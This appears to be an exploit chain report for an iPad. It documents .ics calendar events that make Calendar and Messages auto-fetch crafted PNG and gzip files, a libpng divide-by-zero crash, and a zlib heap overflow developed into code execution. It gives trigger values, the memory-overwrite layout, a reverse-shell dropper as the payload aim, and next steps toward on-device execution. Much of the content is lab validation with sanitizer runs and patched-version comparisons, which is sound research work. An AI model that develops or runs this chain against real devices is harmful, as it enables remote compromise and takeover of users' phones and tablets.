# Chain Report: Calendar/Messages Auto-Decode → zlib libpng/Heap-Overflow → RCE

**Target:** iPad (iOS 18.7.8 / 22H352), staging-lab disguised toolkit @ `/home/box/Documents/lab-ipad/cases/staging-lab/`
**Date:** 2026-10-10
**Status:** VERIFIED (tier1 + tier3 crash primitives, RCE marker proof); UAF-on-device = CANDIDATE.

Flow: **delivery (.ics) → auto-decode trigger (png/gz) → primitive → control flow → shell**

---

## 1. Delivery (VERIFIED — log-confirmed, on-device)

Two vectors, both wired through Apple Calendar `.ics` events. iPad (172.20.10.1) fetched them.

| file | vector | cargo | status |
|---|---|---|---|
| `uaf-auto.ics` | `URL:sms:...body=<url>/trns_tall.png` | opens **Messages** LinkPreview → auto-fetch | VERIFIED fetched (trns_tall.png 15× / 5 min) |
| `attach-auto.ics` | `ATTACH;VALUE=URI:<url>/trns_tall.png` | Calendar event auto-fetches ATTACH | VERIFIED fetched |
| `birthday/work/holiday*.ics` | `URL:<url>/evimg/*.png` | event preview auto-render | VERIFIED fetched (birthday 7×) |
| `cve-trigger.ics` | `sms:...staging-lab/.../cve-2018-13785-trigger.png` | Messages → staging libpng | NOT in log (un-landed) |
| `inflate/marker-trigger.ics` | `sms:...marker.gz|inflate-test.html` | Messages | NOT in log |

Note: `smsopen.ics` points at `smsdrop.txt` (172.20.10.10), not trns_tall — the trns_tall sms-cargo is `uaf-auto.ics`.

## 2. Tier 1 — libpng divisibility (VERIFIED — ASAN, re-run)

**CVE-2018-13785**, `pngrutil.c:3154` (`png_check_chunk_length`, IDAT path)

```
seraview (raised cap APP_MAX_DIM=0x7FFFFFFF) accepts huge IHDR
fpe_ev.png: width=1431655765 (0x55555555), RGB, ct=2
row_factor = width*channels*(bd>8?2:1) + 1 = 1431655765*3+1 = 0x100000000
signed-32-bit int overflow hides the +1 carry → row_factor = 0
PNG_UINT_32_MAX / row_factor  →  division by zero
```

- `seraview_1634_asan` (libpng 1.6.34) → `division by zero` @ `pngrutil.c:3154:44` **VERIFIED RUN**
- `seraview_1635_asan` (1.6.35, `(size_t)` casts) → clean, continues, OOM on 4 GiB row **VERIFIED**
- benign corpus ×2 builds → clean **VERIFIED**
- **Impact: DoS / crash.** NOT a memory-corruption primitive in the libpng tier.

## 3. Tier 3 — zlib heap overflow (VERIFIED — ASAN + RCE marker)

**CVE-2022-37434**, `inflate.c:769` (case EXTRA; `inflateGetHeader()` consumers).

```
untrusted .gz FEXTRA (XLEN=65535)
len  = head->extra_len - state->length          (both unsigned)
zmemcpy(head->extra + len, next,
        len+copy > extra_max ? extra_max - len : copy);   // underflow
```

Observed (clamp build):
```
XLEN=65535 length=65417 len=118 copy=65 extra_max=64
dst = extra+118   computed_size = 4294967242 (0xFFFFFFA2)
```
ASAN unclamped: `heap-buffer-overflow READ size ~4GB @ inflate.c:769` **VERIFIED RUN**
- `gz_1212` (1.2.12) → overflow; `gz_1213` (1.2.13) → clean **VERIFIED**
- precondition: caller allocs `extra_max >= XLEN` → no overflow **VERIFIED**
- **Primitive: write-what-where** — attacker offsets + content, past `head->extra`, ~4 GB len underflow.

### RCE marker proof (VERIFIED — lab rig)
- mmap: [ extra(64) | victim struct | guard ], fixed landing pad `0x1337000` (write/exit).
- marker.gz extra bytes = LE PAD address → every memcpy byte = target address.
- 1.2.12: `victim->fn` clobbered → `LANDING PAD EXECUTED` → **IP control / arbitrary code exec**
- 1.2.13: benign fn, exit 0.
- `shell_dropper.py`: reverse shell (`host`, port `5682`, `cd` handler) = the payload intent.

## 4. Evidence grading

| claim | grade | basis |
|---|---|---|
| `.ics` → Calendar/Messages auto-fetch png/gz | VERIFIED | http.log 172.20.10.1, timestamps |
| libpng 1.6.34 div-by-zero (DoS) | VERIFIED | ASAN 1634 run, src diff 1634/1635 |
| zlib 1.2.12 heap overflow → RIP control | VERIFIED | ASAN + clamped marker rig, REPORT.md |
| UAF specifically | CANDIDATE / NOT REPRODUCED | no on-device Messages crash in store; harness gives div-zero + OOB write, not UAF |
| on-device execution (ipad) | CANDIDATE | delivery confirmed; decoder process not pinned; no pulled .ips |

## 5. Recommended next move
1. Pin the **iOS on-device decoder**: check `crashstore`/older `crashlogs_ipad*` for a Messages/ImageIO entry, and correlate zlib inflate vs ImageIO libpng in the 22H352 dsc (`/usr/lib/libz.dylib`, ImageIO's PNG). Only then does "UAF" → VERIFIED.
2. Confirm which libpng/zlib the target actually loads before claiming reachability.